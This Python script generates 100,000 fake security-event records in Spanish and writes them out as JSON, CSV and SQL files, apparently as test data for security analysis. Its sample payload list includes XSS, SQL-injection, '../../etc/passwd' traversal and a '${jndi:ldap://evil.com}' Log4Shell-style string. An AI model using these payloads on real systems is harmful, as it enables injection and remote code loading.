#!/usr/bin/env python3

import json
import csv
import random
from datetime import datetime, timedelta
from pathlib import Path

NUM_REGISTROS = 100000
OUTPUT_DIR = Path("datos_generados")
OUTPUT_DIR.mkdir(exist_ok=True)

TIPOS_ATAQUE = ["SQL Injection", "XSS", "Brute Force", "DDoS", "Phishing", "Ransomware", "Malware", 
                "Port Scanning", "Buffer Overflow", "Zero-Day", "Credential Stuffing", "Man-in-the-Middle"]
SEVERIDADES = ["CRÍTICA", "ALTA", "MEDIA", "BAJA", "INFORMATIVA"]
ESTADOS_EVENTO = ["Detectado", "Bloqueado", "Mitigado", "Investigando", "Resuelto", "Falso Positivo"]
USUARIOS = [f"user{i}" for i in range(1, 101)] + ["admin", "root", "hacker", "anonymous"]
SISTEMAS = ["Windows Server", "Linux", "MacOS", "IoT Device", "Router", "Firewall", "Proxy", "Database", "Web Server", "VPN Gateway"]
PAYLOADS = ["<script>alert('xss')</script>", "'; DROP TABLE--", "SELECT * FROM users", 
            "../../etc/passwd", "${jndi:ldap://evil.com}", "cmd.exe", "/bin/bash", "chmod 777"]
PUERTOS = [20, 21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5900, 8080, 8443, 9200, 27017, 6379]
PROTOCOLOS = ["TCP", "UDP", "ICMP", "SSH", "HTTP", "HTTPS", "FTP", "DNS", "SMTP", "RDP"]

def generar_ip():
    """Genera una IP válida"""
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def generar_timestamp():
    """Genera un timestamp en los últimos 30 días"""
    dias_atras = random.randint(1, 30)
    horas_atras = random.randint(0, 23)
    minutos_atras = random.randint(0, 59)
    segundos_atras = random.randint(0, 59)
    
    timestamp = datetime.now() - timedelta(days=dias_atras, hours=horas_atras, minutes=minutos_atras, seconds=segundos_atras)
    return timestamp.strftime("%Y-%m-%d %H:%M:%S")

def generar_hash_md5():
    """Genera un hash MD5 simulado"""
    import hashlib
    random_str = f"{random.random()}{datetime.now()}"
    return hashlib.md5(random_str.encode()).hexdigest()

def generar_registro():
    """Genera un registro de evento de seguridad con 13 campos"""
    return {
        "id": None,  # Se asignará secuencialmente
        "timestamp": generar_timestamp(),
        "ip_origen": generar_ip(),
        "ip_destino": generar_ip(),
        "puerto_destino": random.choice(PUERTOS),
        "protocolo": random.choice(PROTOCOLOS),
        "tipo_ataque": random.choice(TIPOS_ATAQUE),
        "usuario": random.choice(USUARIOS),
        "sistema_destino": random.choice(SISTEMAS),
        "severidad": random.choice(SEVERIDADES),
        "estado": random.choice(ESTADOS_EVENTO),
        "payload": random.choice(PAYLOADS),
        "bytes_transferidos": random.randint(100, 1000000),
        "hash_md5": generar_hash_md5()
    }

def generar_json():
    """Genera archivo JSON con 100,000 registros"""
    print(f"Generando JSON con {NUM_REGISTROS} registros...")
    datos = []
    for i in range(NUM_REGISTROS):
        registro = generar_registro()
        registro["id"] = i + 1
        datos.append(registro)
        if (i + 1) % 20000 == 0:
            print(f"  {i + 1} registros generados...")
    
    archivo_json = OUTPUT_DIR / "datos_seguridad.json"
    with open(archivo_json, 'w', encoding='utf-8') as f:
        json.dump(datos, f, ensure_ascii=False, indent=2)
    
    tamaño = archivo_json.stat().st_size / (1024 * 1024)
    print(f"JSON creado: {archivo_json} ({tamaño:.2f} MB)")
    return archivo_json

def generar_csv():
    """Genera archivo CSV con 100,000 registros"""
    print(f"Generando CSV con {NUM_REGISTROS} registros...")
    archivo_csv = OUTPUT_DIR / "datos_seguridad.csv"
    
    campos = ["id", "timestamp", "ip_origen", "ip_destino", "puerto_destino", "protocolo", 
              "tipo_ataque", "usuario", "sistema_destino", "severidad", "estado", "payload", 
              "bytes_transferidos", "hash_md5"]
    
    with open(archivo_csv, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=campos)
        writer.writeheader()
        
        for i in range(NUM_REGISTROS):
            registro = generar_registro()
            registro["id"] = i + 1
            writer.writerow(registro)
            if (i + 1) % 20000 == 0:
                print(f"  {i + 1} registros generados...")
    
    tamaño = archivo_csv.stat().st_size / (1024 * 1024)
    print(f"CSV creado: {archivo_csv} ({tamaño:.2f} MB)")
    return archivo_csv

def generar_sql():
    """Genera archivo SQL con INSERT statements para 100,000 registros"""
    print(f"Generando SQL con {NUM_REGISTROS} registros...")
    archivo_sql = OUTPUT_DIR / "datos_seguridad.sql"
    
    with open(archivo_sql, 'w', encoding='utf-8') as f:
        f.write("-- Script de eventos de seguridad\n")
        f.write("-- Base de datos para análisis de ciberseguridad\n\n")
        f.write("CREATE TABLE IF NOT EXISTS eventos_seguridad (\n")
        f.write("    id INT PRIMARY KEY,\n")
        f.write("    timestamp DATETIME,\n")
        f.write("    ip_origen VARCHAR(15),\n")
        f.write("    ip_destino VARCHAR(15),\n")
        f.write("    puerto_destino INT,\n")
        f.write("    protocolo VARCHAR(20),\n")
        f.write("    tipo_ataque VARCHAR(50),\n")
        f.write("    usuario VARCHAR(50),\n")
        f.write("    sistema_destino VARCHAR(50),\n")
        f.write("    severidad VARCHAR(15),\n")
        f.write("    estado VARCHAR(20),\n")
        f.write("    payload TEXT,\n")
        f.write("    bytes_transferidos INT,\n")
        f.write("    hash_md5 VARCHAR(32)\n")
        f.write(");\n\n")
        
        # Inserción de datos
        f.write("-- Inserción de eventos de seguridad\n")
        for i in range(NUM_REGISTROS):
            registro = generar_registro()
            registro["id"] = i + 1
            
            # Escapar comillas en payload
            payload = registro["payload"].replace("'", "\\'")
            
            insert = (
                f"INSERT INTO eventos_seguridad VALUES ("
                f"{registro['id']}, "
                f"'{registro['timestamp']}', "
                f"'{registro['ip_origen']}', "
                f"'{registro['ip_destino']}', "
                f"{registro['puerto_destino']}, "
                f"'{registro['protocolo']}', "
                f"'{registro['tipo_ataque']}', "
                f"'{registro['usuario']}', "
                f"'{registro['sistema_destino']}', "
                f"'{registro['severidad']}', "
                f"'{registro['estado']}', "
                f"'{payload}', "
                f"{registro['bytes_transferidos']}, "
                f"'{registro['hash_md5']}'"
                f");\n"
            )
            f.write(insert)
            
            if (i + 1) % 20000 == 0:
                print(f"  {i + 1} registros generados...")
    
    tamaño = archivo_sql.stat().st_size / (1024 * 1024)
    print(f"SQL creado: {archivo_sql} ({tamaño:.2f} MB)")
    return archivo_sql

def mostrar_resumen():
    """Muestra un resumen de los archivos generados"""
    print("\n" + "=" * 80)
    print("RESUMEN DE GENERACIÓN - EVENTOS DE CIBERSEGURIDAD")
    print("=" * 80)
    
    for archivo in sorted(OUTPUT_DIR.glob("datos_seguridad.*")):
        tamaño = archivo.stat().st_size / (1024 * 1024)
        lineas = 0
        with open(archivo, 'r', encoding='utf-8') as f:
            lineas = len(f.readlines())
        print(f"{archivo.name:30} | Tamaño: {tamaño:8.2f} MB | Líneas: {lineas:>7}")
    
    print("=" * 80)

if __name__ == "__main__":
    print("\n" + "=" * 80)
    print(f"GENERADOR DE EVENTOS DE CIBERSEGURIDAD - {NUM_REGISTROS:,} registros")
    print("=" * 80 + "\n")
    
    inicio = datetime.now()
    
    generar_json()
    generar_csv()
    generar_sql()
    
    tiempo_total = (datetime.now() - inicio).total_seconds()

